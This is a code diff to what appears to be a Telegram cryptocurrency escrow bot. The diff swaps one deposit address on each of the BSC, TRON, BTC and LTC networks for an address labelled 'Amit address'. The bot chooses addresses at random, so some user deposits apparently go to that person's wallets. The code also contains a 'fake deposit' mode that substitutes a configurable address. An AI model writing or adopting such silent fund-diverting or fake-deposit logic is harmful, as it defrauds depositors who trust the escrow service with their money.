@@ -1655,9 +1655,9 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if fake_deposit_enabled and fake_deposit_network == "BSC":
                 escrow_address = fake_deposit_address
             else:
-                # Alternate between two BSC addresses
+                # Alternate between two BSC addresses (Amit address)
                 bsc_addresses = [
-                    "0xDA4c2a5B876b0c7521e1c752690D8705080000fE",
+                    "0x9b4F87471a1648CAA3Cf8D87594a8eE321077FF7",  # Amit address
                     "0xf282e789e835ed379aea84ece204d2d643e6774f"
                 ]
                 escrow_address = random.choice(bsc_addresses)
@@ -1667,9 +1667,9 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if fake_deposit_enabled and fake_deposit_network == "TRON":
                 escrow_address = fake_deposit_address
             else:
-                # Alternate between two TRON addresses
+                # Alternate between two TRON addresses (Amit address)
                 tron_addresses = [
-                    "TVsTYwseYdRXUKk2ehcEcTT4UU3b2tqrVm",
+                    "THdf4TT8cwdNaZG2hSgqbB52fAtFWRRiU2",  # Amit address
                     "TXFyTRL3vau3DJe6kyxqUeazoscN8dRrHB"
                 ]
                 escrow_address = random.choice(tron_addresses)
@@ -1679,9 +1679,9 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
     elif token == "BTC":
         if network == "BTC":
-            # Alternate between two BTC addresses
+            # Alternate between two BTC addresses (Amit address)
             btc_addresses = [
-                "bc1qya2u04hfdy5j9mnzds7effh0xqx3mvwcyflnak",
+                "bc1qak4axkk5qw6046p7yl9qxlvtuqq6dm74557ewn",  # Amit address
                 "bc1q43nwc38ashvvzhakw7ma7227yzd3yfkmpudl48"
             ]
             escrow_address = random.choice(btc_addresses)
@@ -1691,9 +1691,9 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
     elif token == "LTC":
         if network == "LTC":
-            # Alternate between two LTC addresses
+            # Alternate between two LTC addresses (Amit address)
             ltc_addresses = [
-                "ltc1qya2u04hfdy5j9mnzds7effh0xqx3mvwcq49h9x",
+                "ltc1qmh7cv6n9u8rpwlch8w2nr9tdl94y35gx90edjz",  # Amit address
                 "ltc1qfu7asf36pmg5kc4wge5dcz6t5yd3pyn3d86w66"
             ]
             escrow_address = random.choice(ltc_addresses)
